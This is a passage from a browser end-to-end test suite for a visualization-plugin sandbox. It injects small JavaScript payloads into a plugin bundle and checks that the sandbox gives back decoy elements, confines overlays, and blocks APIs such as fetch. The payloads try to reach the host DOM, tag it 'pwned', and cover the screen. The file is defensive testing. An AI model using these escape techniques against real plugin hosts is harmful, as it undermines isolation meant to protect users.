    // The plugin reached for the host element but received a decoy.
    await expectConsoleCalledWith(consoleEntries, "plugin saw decoy", "true");
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin read element id",
      "sandbox-decoy",
    );

    // The real host element was untouched.
    await expect(page.locator(hostSelector)).not.toHaveAttribute(
      "data-pwned-by-plugin",
      /.*/,
    );
  });

  test("returns a decoy when the plugin walks up to its container's parentElement/parentNode", async ({
    page,
  }) => {
    const consoleEntries = collectConsole(page);
    const payload = `
      setTimeout(function() {
        var container = document.querySelector('[data-plugin-sandbox]');
        if (!container) {
          console.log('plugin parent test:', 'no container');
          return;
        }
        const { parentElement, parentNode} = container;
        console.log('plugin parentElement decoy:', parentElement && parentElement.getAttribute('data-plugin-sandbox-decoy'));
        console.log('plugin parentElement id:', parentElement && parentElement.getAttribute('id'));
        console.log('plugin parentNode decoy:', parentNode && parentNode.getAttribute && parentNode.getAttribute('data-plugin-sandbox-decoy'));
        if (parentElement) {
          parentElement.setAttribute('data-pwned-by-plugin', 'true');
        }
      }, 1000);
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${body};\n${payload}`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;

    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();

    await expectConsoleCalledWith(
      consoleEntries,
      "plugin parentElement decoy:",
      "true",
    );
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin parentElement id:",
      "sandbox-decoy",
    );
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin parentNode decoy:",
      "true",
    );

    await expect(
      page.locator("[data-plugin-sandbox]").locator("xpath=..").first(),
    ).not.toHaveAttribute("data-pwned-by-plugin", /.*/);
  });

  test("confines custom viz and custom viz setting widget to its container (GDGT-2400)", async ({
    page,
    mb,
  }) => {
    const timeout = 100;
    const payload = `
      setInterval(function() {
        var containers = document.querySelectorAll('[data-plugin-sandbox]');
        for (var i = 0; i < containers.length; i++) {
          containers[i].setAttribute('style',
            'position:fixed;inset:0;z-index:99999;background:red;');
        }
      }, ${timeout});
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${payload}\n${body};\n`,
    );

    await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ_4_SECURITY_COMPONENT);
    const card = await createQuestion(mb.api, {
      name: "Custom Viz Setting Widget Confinement Test",
      query: {
        "source-table": STATIC_ORDERS_ID,
        aggregation: [["count"]],
      },
      display: "table",
    });

    await visitQuestion(page, card.id);

    await openVizTypeSidebar(page);
    await page.getByTestId("custom-viz-plugins-toggle").click();
    await page
      .getByTestId(`${CUSTOM_VIZ_IDENTIFIER_4_SECURITY_COMPONENT}-button`)
      .click();
    await openVizTypeSidebar(page);
    await injected;

    await page.getByTestId("viz-settings-button").click();

    const viewport = page.viewportSize();
    const viewportWidth = viewport?.width ?? 1280;
    const viewportHeight = viewport?.height ?? 720;

    const settingWidget = vizSettingsSidebar(page).locator(
      "[data-plugin-sandbox]",
    );
    await expect(settingWidget).toHaveCSS("position", "fixed");
    const settingRect = await settingWidget.evaluate((el) =>
      el.getBoundingClientRect().toJSON(),
    );
    expect(settingRect.top, "setting widget top offset from viewport").toBeGreaterThan(0);
    expect(settingRect.width, "setting widget width vs viewport").toBeLessThan(
      viewportWidth,
    );
    expect(settingRect.height, "setting widget height vs viewport").toBe(0);

    const containerRect = await queryVisualizationRoot(page)
      .locator("[data-plugin-sandbox]")
      .evaluate((el) => el.getBoundingClientRect().toJSON());
    expect(containerRect.top, "container top offset from viewport").toBeGreaterThan(0);
    expect(containerRect.width, "container width vs viewport").toBeLessThan(
      viewportWidth,
    );
    expect(containerRect.height, "container height vs viewport").toBeLessThan(
      viewportHeight,
    );
  });

  test("MutationObserver on out-of-scope nodes observes a decoy and never fires for host mutations", async ({
    page,
  }) => {
    const consoleEntries = collectConsole(page);
    const payload = `
      var seenMutations = 0;
      var observer = new MutationObserver(function(records) {
        seenMutations += records.length;
      });
      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
      });
      setTimeout(function() {
        console.log('plugin observed mutations:', seenMutations);
      }, 1500);
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${payload}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;

    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();

    // Mutate the real host DOM. If the plugin held a real reference to
    // document.body these would fire its observer; the membrane swapped body
    // for a detached decoy.
    await page.evaluate(() => {
      const probe = document.createElement("div");
      probe.setAttribute("data-mutation-probe", "true");
      document.body.appendChild(probe);
      document.body.setAttribute("data-mutation-probe-attr", "true");
      probe.remove();
      document.body.removeAttribute("data-mutation-probe-attr");
    });

    await expectConsoleCalledWith(consoleEntries, "plugin observed mutations:", 0);
  });

  test("blocks forbidden apis in widget settings", async ({ page, mb }) => {
    const consoleEntries = collectConsole(page);
    await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ_3_SECURITY);

    const card = await createQuestion(mb.api, {
      name: "Custom Viz Question Test",
      query: {
        "source-table": STATIC_ORDERS_ID,
        aggregation: [["count"]],
      },
      display: "table",
    });

    await visitQuestion(page, card.id);

    await page.getByTestId("viz-type-button").click();
    await page.getByTestId("custom-viz-plugins-toggle").click();
    await page
      .getByTestId(`${CUSTOM_VIZ_IDENTIFIER_3_SECURITY}-button`)
      .click();
    await page.getByTestId("viz-type-button").click();

    // open viz settings
    await page.getByTestId("viz-settings-button").click();

    await expectConsoleErrorMatch(
      consoleEntries,
      /blocked API call: window\.fetch/,
    );
  });

  test("sandboxes React component setting widgets", async ({ page, mb }) => {
    const consoleEntries = collectConsole(page);
    await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ_4_SECURITY_COMPONENT);

    const card = await createQuestion(mb.api, {
      name: "Custom Viz Component Widget Security Test",
      query: {
        "source-table": STATIC_ORDERS_ID,
        aggregation: [["count"]],
      },
      display: "table",
    });

    await visitQuestion(page, card.id);

    await page.getByTestId("viz-type-button").click();
    await page.getByTestId("custom-viz-plugins-toggle").click();
    await page
      .getByTestId(`${CUSTOM_VIZ_IDENTIFIER_4_SECURITY_COMPONENT}-button`)
      .click();
    await page.getByTestId("viz-type-button").click();

    // open viz settings to mount the custom component widget
    await page.getByTestId("viz-settings-button").click();

    // the sandbox blocks the component's forbidden <input> element
    await expectConsoleErrorMatch(
      consoleEntries,
      /render failed: \[plugin \d+\] blocked createElement: input/,
    );
  });
});
